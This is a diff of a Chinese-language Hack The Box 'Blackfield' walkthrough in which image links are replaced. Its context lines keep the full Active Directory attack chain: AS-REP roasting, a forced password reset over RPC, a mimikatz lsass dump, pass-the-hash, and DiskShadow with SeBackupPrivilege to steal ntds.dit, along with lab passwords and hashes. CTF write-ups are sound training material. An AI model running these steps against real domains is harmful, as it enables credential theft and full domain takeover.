@@ -11,9 +11,11 @@ nmap 10.10.10.192 --script=vuln
 nmap 10.10.10.192 -sU --top-ports 20 -Pn
 ```
 
-![image-20241127190756289](E:\渗透学习\知识\语雀\assets\image-20241127190756289.png)
+![image](https://github.com/user-attachments/assets/4dbc077f-33c1-4d12-a789-fc630def9f8a)
 
-![image-20241127190945501](E:\渗透学习\知识\语雀\assets\image-20241127190945501.png)
+
+![image](https://github.com/user-attachments/assets/6f225420-120b-4151-a3a6-416ea9740371)
+
 
 ```
 10.10.10.192 BLACKFIELD.local
@@ -27,7 +29,8 @@ nmap 10.10.10.192 -sU --top-ports 20 -Pn
 smbclient -L //10.10.10.192/
 ```
 
-![image-20241127190853173](E:\渗透学习\知识\语雀\assets\image-20241127190853173.png)
+![image](https://github.com/user-attachments/assets/9feaf9e1-af71-4dcf-b9f3-41f1d304e8e4)
+
 
 ```
 smbclient //10.10.10.192/forensic
@@ -361,9 +364,10 @@ cat userget | awk -F' ' "{print \$1}"  > user
 GetNPUsers.py -no-pass -dc-ip 10.10.10.192 BLACKFIELD.local/ -usersfile dcuser
 ```
 
-![image-20241127193101909](E:\渗透学习\知识\语雀\assets\image-20241127193101909.png)
+![image](https://github.com/user-attachments/assets/e7a77266-8ad8-4ceb-81b5-7914320a3354)
 
-![image-20241127193226337](E:\渗透学习\知识\语雀\assets\image-20241127193226337.png)
+
+![image](https://github.com/user-attachments/assets/aead709f-c47a-4718-98d0-733dd239f682)
 
 support可以roasting攻击，尝试破解hash
 
@@ -384,9 +388,11 @@ crackmapexec smb BLACKFIELD.local -u support -p '#00^BlackKnight'
 evil-winrm -i 10.10.10.192 -u "support" -p '#00^BlackKnight'
 ```
 
-![image-20241127193442912](E:\渗透学习\知识\语雀\assets\image-20241127193442912.png)
+![image](https://github.com/user-attachments/assets/218be588-ffd3-4616-82f8-07230c935ea7)
 
-![image-20241127193539485](E:\渗透学习\知识\语雀\assets\image-20241127193539485.png)
+
+![image](https://github.com/user-attachments/assets/cf10dd57-9234-47b8-8945-d4a53c55dce2)
+
 
 失败了，smb登登看
 
@@ -395,14 +401,16 @@ smbclient -L //10.10.10.192/ -U "support"
 #00^BlackKnight
 ```
 
-![image-20241127193851699](E:\渗透学习\知识\语雀\assets\image-20241127193851699.png)
+![image](https://github.com/user-attachments/assets/b620cb50-ea24-4f6f-ab29-0f095246fd05)
+
 
 ```
 smbclient //10.10.10.192/forensic -U "support"
 smbclient //10.10.10.192/profiles$ -U "support"
 ```
 
-![image-20241127193937520](E:\渗透学习\知识\语雀\assets\image-20241127193937520.png)
+![image](https://github.com/user-attachments/assets/02b7ed5f-ab02-4d7b-af3c-e38b7baf8290)
+
 
 profiles也没啥，看看别的吧
 
@@ -411,11 +419,12 @@ psexec.py support:#00^BlackKnight@10.10.10.192
 bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d BLACKFIELD.local -dc BLACKFIELD.local -ns 10.10.10.192 --zip
 ```
 
-![image-20241127200210938](E:\渗透学习\知识\语雀\assets\image-20241127200210938.png)
+![image](https://github.com/user-attachments/assets/be835bb2-a9fa-4527-bc50-0a73fd169255)
 
 可以看到remote只有SVC_BACKUP可以登录
 
-![image-20241127200007220](E:\渗透学习\知识\语雀\assets\image-20241127200007220.png)
+![image](https://github.com/user-attachments/assets/f7c52d5e-2ee2-4cef-ba6b-1e00d33c3c4a)
+
 
 ok，又可以拿到一个用户，既然不能登录，看看能不能rpc登录修改密码
 
@@ -428,9 +437,11 @@ setuserinfo2 AUDIT2020 23 '0xptS3@'
 crackmapexec smb BLACKFIELD.local -u AUDIT2020 -p '0xptS3@'
 ```
 
-![image-20241127200633812](E:\渗透学习\知识\语雀\assets\image-20241127200633812.png)
+![image](https://github.com/user-attachments/assets/558b0ca6-812c-4eee-871d-8e639c2f83c4)
 
-![image-20241127200709780](E:\渗透学习\知识\语雀\assets\image-20241127200709780.png)
+
+![image](https://github.com/user-attachments/assets/24ed49ef-9821-4cd6-90a8-765967f59a73)
+
 
 成功了，尝试登登winrm，尽管不属于remote组
 
@@ -442,36 +453,45 @@ smbclient //10.10.10.192/profiles$ -U "support"
 psexec.py AUDIT2020:0xptS3\@@10.10.10.192
 ```
 
-![image-20241127200856577](E:\渗透学习\知识\语雀\assets\image-20241127200856577.png)
+![image](https://github.com/user-attachments/assets/62a9b272-912a-4869-a1ca-93fe746272df)
 
-![image-20241127200925733](E:\渗透学习\知识\语雀\assets\image-20241127200925733.png)
 
-![image-20241127200949885](E:\渗透学习\知识\语雀\assets\image-20241127200949885.png)
+![image](https://github.com/user-attachments/assets/479d586a-0acf-40a1-a5d4-371ae5fa938c)
+
+
+![image](https://github.com/user-attachments/assets/d724e0ba-349e-4d09-b5dc-e0658364c4f7)
+
 
 这次有权限看forensic了，我们看看
 
-![image-20241127201209274](E:\渗透学习\知识\语雀\assets\image-20241127201209274.png)
+![image](https://github.com/user-attachments/assets/e7240704-58c4-4bbf-94c6-6508fc2df889)
+
 
 get下来看看这部分
 
-![image-20241127201245394](E:\渗透学习\知识\语雀\assets\image-20241127201245394.png)
+![image](https://github.com/user-attachments/assets/ab264811-1dc8-4e43-8b10-bf2e97b223af)
+
 
 ```
 Ipwn3dYourCompany
 Administrator
 ```
 
-![image-20241127201335232](E:\渗透学习\知识\语雀\assets\image-20241127201335232.png)
+![image](https://github.com/user-attachments/assets/e3c74c2f-9b65-418e-8d96-a8b3169282eb)
+
 
 太多了，我们接着看看memory_analysis下的
 
-![image-20241127201731940](E:\渗透学习\知识\语雀\assets\image-20241127201731940.png)
+![image](https://github.com/user-attachments/assets/4d0ba23c-ce8e-4646-8019-dd6c6f081e3f)
+
 
 看看lsass.zip
 
-![image-20241127201945133](E:\渗透学习\知识\语雀\assets\image-20241127201945133.png)
+![image](https://github.com/user-attachments/assets/83b93521-d51a-4523-b41d-e59a5ed7754a)
 
-![image-20241127201952104](E:\渗透学习\知识\语雀\assets\image-20241127201952104.png)
+
+![image](https://github.com/user-attachments/assets/43bfffa2-aee0-4e97-b456-f2dbb14e8b04)
+
 
 猕猴桃打开dmp
 
@@ -483,7 +503,8 @@ Switch to MINIDUMP
 mimikatz # sekurlsa::logonPasswords full
 ```
 
-![image-20241127202325569](E:\渗透学习\知识\语雀\assets\image-20241127202325569.png)
+![image](https://github.com/user-attachments/assets/603a4427-57cc-4f15-b2bd-066122bd8f3b)
+
 
 到此就可以进行PTH了
 
@@ -494,14 +515,16 @@ svc_backup
 
 下面还有信息我们继续看
 
-![image-20241127202620650](E:\渗透学习\知识\语雀\assets\image-20241127202620650.png)
+![image](https://github.com/user-attachments/assets/105d8d6f-f5b6-461c-bbe6-e559797b786a)
+
 
 ```
 Administrator
 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
 ```
 
-![image-20241127202655408](E:\渗透学习\知识\语雀\assets\image-20241127202655408.png)
+![image](https://github.com/user-attachments/assets/db31b56f-ade9-4bd6-9364-1d176dc83549)
+
 
 ```
 DC01$
@@ -516,7 +539,8 @@ b624dc83a27cc29da11d9bf25efea796
 evil-winrm -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192 -u svc_backup
 ```
 
-![image-20241127202931425](E:\渗透学习\知识\语雀\assets\image-20241127202931425.png)
+![image](https://github.com/user-attachments/assets/a222c3ae-2035-46e7-ae24-bf8e9e2ca906)
+
 
 成功
 
@@ -524,14 +548,16 @@ evil-winrm -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192 -u svc_backup
 
 拿着别的htlm尝试下
 
-![image-20241127202620650](E:\渗透学习\知识\语雀\assets\image-20241127202620650.png)
+![image](https://github.com/user-attachments/assets/03ea0936-b5f5-4afd-bf2c-a505e660cf76)
+
 
 ```
 Administrator
 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
 ```
 
-![image-20241127202655408](E:\渗透学习\知识\语雀\assets\image-20241127202655408.png)
+![image](https://github.com/user-attachments/assets/e167b297-aa69-4bdc-bc19-3f860c0d0f6d)
+
 
 ```
 DC01$
@@ -544,15 +570,18 @@ b624dc83a27cc29da11d9bf25efea796
 crackmapexec.exe 10.10.10.192 -u DC01$ -H aada8eda23213c027743e6c498d751aa:b624dc83a27cc29da11d9bf25efea796
 ```
 
-![image-20241127203548685](E:\渗透学习\知识\语雀\assets\image-20241127203548685.png)
+![image](https://github.com/user-attachments/assets/ad6cbc05-b244-4518-8b0c-082b653fec1a)
+
 
 失败了，重新想办法吧
 
-![image-20241127203605815](E:\渗透学习\知识\语雀\assets\image-20241127203605815.png)
+![image](https://github.com/user-attachments/assets/a068e57e-f5ce-4111-b8fb-5168b60f1579)
+
 
 这个好像没啥用呀，继续收集
 
-![image-20241127204722488](E:\渗透学习\知识\语雀\assets\image-20241127204722488.png)
+![image](https://github.com/user-attachments/assets/519a01a1-5371-4bfd-86af-94bda2f3ab46)
+
 
 ```
 Mates,
@@ -573,7 +602,8 @@ PS: Because the audit report is sensitive, I have encrypted it on the desktop (r
 whoami /all
 ```
 
-![image-20241127205136158](E:\渗透学习\知识\语雀\assets\image-20241127205136158.png)
+![image](https://github.com/user-attachments/assets/c9c9412f-a0e1-4567-9f8e-5d9bf49905dd)
+
 
 可以尝试
 
@@ -583,11 +613,14 @@ reg save hklm\sam C:\Users\svc_backup\documents\sam.hive
 secretsdump.py -sam sam.hive -system system.hive LOCAL
 ```
 
-![image-20241127205656386](E:\渗透学习\知识\语雀\assets\image-20241127205656386-1732712217138-1.png)
+![image](https://github.com/user-attachments/assets/c4cd7331-b544-4150-b0b7-8542828d70dc)
 
-![image-20241127210242385](E:\渗透学习\知识\语雀\assets\image-20241127210242385.png)
 
-![image-20241127210426419](E:\渗透学习\知识\语雀\assets\image-20241127210426419.png)
+![image](https://github.com/user-attachments/assets/5330b03d-959f-4f17-99dd-02257ba00a88)
+
+
+![image](https://github.com/user-attachments/assets/9a80eb1a-4aca-4d65-8656-48b05699da83)
+
 
 ```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
@@ -599,9 +632,11 @@ crackmapexec smb 10.10.10.192 -u Administrator -H aad3b435b51404eeaad3b435b51404
 psexec.py Administrator@10.10.10.192 -hashes aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051
 ```
 
-![image-20241127210818064](E:\渗透学习\知识\语雀\assets\image-20241127210818064.png)
+![image](https://github.com/user-attachments/assets/52d9c6d9-5941-4f79-85e2-58c2eca93288)
 
-![image-20241127210825929](E:\渗透学习\知识\语雀\assets\image-20241127210825929.png)
+
+![image](https://github.com/user-attachments/assets/963b6151-fdd5-4b98-a01f-023c9690e0a9)
+
 
 失败了，既然域内这么多用户，我们都拿出来碰撞下试试
 
@@ -717,7 +752,8 @@ lydericlefebvre
 cat userdc | awk -F" " '{print $1}'  >> userdcc
 ```
 
-![image-20241127213205825](E:\渗透学习\知识\语雀\assets\image-20241127213205825.png)
+![image](https://github.com/user-attachments/assets/c6fc09b6-0cea-4c18-bd26-eb57780bd3fe)
+
 
 进行密码喷洒
 
@@ -727,7 +763,8 @@ crackmapexec smb 10.10.10.192 -u userdcc -H aad3b435b51404eeaad3b435b51404ee:67e
 
 不过一个没成功
 
-![image-20241127214333816](E:\渗透学习\知识\语雀\assets\image-20241127214333816.png)
+![image](https://github.com/user-attachments/assets/f77a3938-85fb-4922-b80c-d798e05e3fd9)
+
 
  然后我看wp去了，发现利用的DiskShadow
 
@@ -741,7 +778,8 @@ crackmapexec smb 10.10.10.192 -u userdcc -H aad3b435b51404eeaad3b435b51404ee:67e
 Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
 ```
 
-![image-20241127221004607](E:\渗透学习\知识\语雀\assets\image-20241127221004607.png)
+![image](https://github.com/user-attachments/assets/1945f14f-e3e9-4252-806e-b40252bccfbd)
+
 
 所以我们就需要disk shadow技术来读取
 
@@ -766,7 +804,8 @@ expose %df% z:
 unix2dos 1.txt
 ```
 
-![image-20241127223117972](E:\渗透学习\知识\语雀\assets\image-20241127223117972.png)
+![image](https://github.com/user-attachments/assets/ab60309e-fd0a-4959-9610-15b1551ae963)
+
 
 然后上传，执行如下命令
 
@@ -774,13 +813,14 @@ unix2dos 1.txt
 diskshadow /s 1.txt
 ```
 
-![image-20241127223153932](E:\渗透学习\知识\语雀\assets\image-20241127223153932.png)
+![image](https://github.com/user-attachments/assets/41c5dde5-31a7-4e04-9090-c963050e0500)
 
 ```
 Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit .\ntds.dit
 ```
 
-![image-20241127223203592](E:\渗透学习\知识\语雀\assets\image-20241127223203592.png)
+![image](https://github.com/user-attachments/assets/81a66c3a-e1dd-4287-9b13-326984538e75)
+
 
 接着进行清理清理
 
@@ -803,7 +843,8 @@ diskshadow /s 1.txt
 secretsdump.py -system system -ntds ntds.dit LOCAL
 ```
 
-![image-20241127223418513](E:\渗透学习\知识\语雀\assets\image-20241127223418513.png)
+![image](https://github.com/user-attachments/assets/bb2d558b-f43a-4c09-a3f6-d4f55b9f023e)
+
 
 进行登录
 
@@ -813,7 +854,8 @@ wmiexec.py -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.10.10.192
 
 这里psexec还登录不了
 
-![image-20241127223500240](E:\渗透学习\知识\语雀\assets\image-20241127223500240.png)
+![image](https://github.com/user-attachments/assets/3db591d8-3cab-4c51-a1aa-e1bd1d5f625f)
+
 
 成功
 
